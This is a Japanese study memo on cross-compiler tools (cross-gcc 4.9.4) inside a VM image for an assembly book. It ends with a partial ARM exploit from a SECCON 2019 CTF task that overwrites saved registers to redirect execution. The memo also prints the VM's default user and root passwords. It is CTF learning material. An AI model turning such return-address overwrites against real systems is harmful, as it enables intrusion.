# cross-gcc

## 開発環境
熱血！／大熱血！ アセンブラ入門  
開発環境のＶＭイメージ
http://kozos.jp/vmimage/burning-asm.html

### ID/PASS
user/progtooluser
root/progtoolroot


### tool

/usr/local/cross-gcc494/bin 配下にobjdumpなどのツールが入っている
例えば arm-elf用の toolは `ls /usr/local/cross-gcc494/bin/arm-elf*` 

objdump なら
```
/usr/local/cross-gcc494/bin/arm-elf-objdump -d arm-elf.x | less
```

#### cross-gcc494-v1.0.tgz
解凍すると、sample ディレクトリにいろんな関数が入っている
これをディスアセンブリしたものが一緒に入っているので、どのアーキテクチャもそれを読んでいけばだいたい動作がわかる


## ARMのexploit例
問題・解答例は以下に保管。 https://github.com/yyamada12/ctfs/tree/master/seccon2019final 

ctfs/seccon2019final/solve/read-password/arm-elf.S

```
.org  0x1c10 - 16 - 256 - 4 - 28
```
org: バイナリをここに配置してくださいという命令

```
_start:

.long 0x61626364
.long 0
.long 0
.long 0
```
16バイトはまず適当に埋める

```
.long 0 /* FP -> FP */
.long 0x1c00 /* IP -> SP */
.long _code /* LR -> PC */
.long 0 /* PC -> discard */
```
戻りアドレスを設定する (`_code`)


make arm-elf.bin すると arm-elf.binが生成される

<!--stackedit_data:
eyJoaXN0b3J5IjpbLTE2MzI4Nzc3OTksMTA3NDYzNzc5NiwtMT
YwNzI3NzY2Miw2MzEyMTU1ODksLTk0NzQyOTNdfQ==
-->